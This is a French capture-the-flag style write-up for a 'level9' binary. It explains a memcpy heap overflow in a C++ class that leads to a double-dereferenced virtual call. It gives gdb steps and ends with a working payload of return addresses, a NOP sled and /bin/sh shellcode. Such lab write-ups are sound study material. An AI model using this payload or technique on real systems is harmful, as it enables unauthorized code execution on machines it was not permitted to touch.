Cette fois, le programme est en c++, avec une classe N. On remarque qu'il n'y a pas d'appel à /bin/sh, on suppose qu'on va devoir injecter un shellcode. Il y a aussi l'utilisation de la fonction memcpy dans la fonction setAnnotation de la classe N, qui va permettre de faire un overflow.

Le seul problème est que le pointeur est déférencé deux fois au moment du return d'EIP:
```
08048677 e8 92 00        CALL       N::setAnnotation                                 undefined setAnnotation(N * this
            00 00
0804867c 8b 44 24 10     MOV        nClass2,dword ptr [ESP + 0x10]=>local_20
08048680 8b 00           MOV        nClass2,dword ptr [nClass2]
08048682 8b 10           MOV        EDX,dword ptr [nClass2]
08048684 8b 44 24 14     MOV        nClass2,dword ptr [ESP + 0x14]=>local_1c
08048688 89 44 24 04     MOV        dword ptr [ESP + 0x4]=>local_2c,nClass2
0804868c 8b 44 24 10     MOV        nClass2,dword ptr [ESP + 0x10]=>local_20
08048690 89 04 24        MOV        dword ptr [ESP]=>local_30,nClass2
08048693 ff d2           CALL       EDX

```
Ce qui équivaut globalement à la syntaxe `(nPointer2->*nPointer2->operatorFunctionPointer)(*nClass1)`. 

En conséquence, le code va se rendre sur la première adresse pointée par EIP, puis prendre l'adresse à ce nouvel emplacement, se rendre dessus, ET uniquement à partir de là reprendre l'exécution du code. Donc il va falloir utiliser deux adresses mémoires.

Il faut donc trouver l'adresse mémoire de la string. On ouvre level9 dans gdb, on met un breakpoint juste après l'appel à setAnnotation, puis on print $eax. On voit que c'est 0x0804a00c.

L'adresse qui va override EIP en premier doit se trouver après 108 chars. On fait pointer sur l'adresse qu'on vient de trouver. Ensuite, on peut faire pointer sur la zone entre buffer[4] et buffer[107], ou bien pointer après la string. Faire après nous donne plus d'espace pour faire une longue nopsled donc on part sur après. Si on regarde $eax après avoir rempli le buffer de A, on peut voir que les addresses à partir de 0x0804a07c peuvent être ciblées. On part sur 0x0804a18c pour être large.

Donc le payload final ressemble à

`./level9 $(python -c "print '\x8c\xa1\x04\x08' + 'A' * 104 + '\x0c\xa0\x04\x08' + '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")`
